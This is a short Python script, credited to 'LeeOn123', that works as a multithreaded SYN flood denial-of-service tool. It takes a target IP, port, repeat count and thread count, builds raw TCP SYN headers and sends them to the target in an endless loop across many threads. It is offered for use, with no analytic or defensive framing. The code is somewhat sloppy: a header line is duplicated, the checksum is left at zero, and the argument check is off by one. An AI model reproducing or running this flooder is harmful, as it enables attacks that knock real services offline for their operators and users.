#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
Code By LeeOn123
'''
import sys
import socket
import struct
import threading
import random

if len(sys.argv) < 4:
  print("Usage : "+sys.argv[0]+" <ip> <port> <times> <threads>")
  sys.exit()
times = (int(sys.argv[3]))
port = (int(sys.argv[2]))
dst_ip = (socket.gethostbyname(sys.argv[1]))
threads = (int(sys.argv[4]))
x = ("1234","2318","123")

def run():
    sockfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    src_port = (int(random.choice(x)))
    dst_port = port
    seq_number = 1000
    ack_number = 0
    data_offset = 5
    reversed_flag = 0
    urg_flag = 0
    ack_flag = 0
    psh_flag = 0
    rst_flag = 0
    syn_flag = 1
    fin_flag = 0
    tcp_flags = fin_flag + (syn_flag << 1) + (rst_flag << 2) + (psh_flag << 3) + (ack_flag << 4) + (urg_flag << 5)
    window_size = 65535
    header_checksum = 0
    urg_pointer = 0
    tcp_header = struct.pack('!HHIIBBHHH', src_port, dst_port, seq_number, ack_number, data_offset << 4, tcp_flags, window_size, header_checksum, urg_pointer)
    tcp_header = struct.pack('!HHIIBBHHH', src_port, dst_port, seq_number, ack_number, data_offset << 4, tcp_flags, window_size, header_checksum, urg_pointer)
    while True:
            try:
               for i in range(times):
                   sockfd.sendto(tcp_header, (dst_ip, 0))
               print("SYN Flooding")
            except:
               print ("Re do")

for y in range(threads):
	th = threading.Thread(target = run)
	th.start()
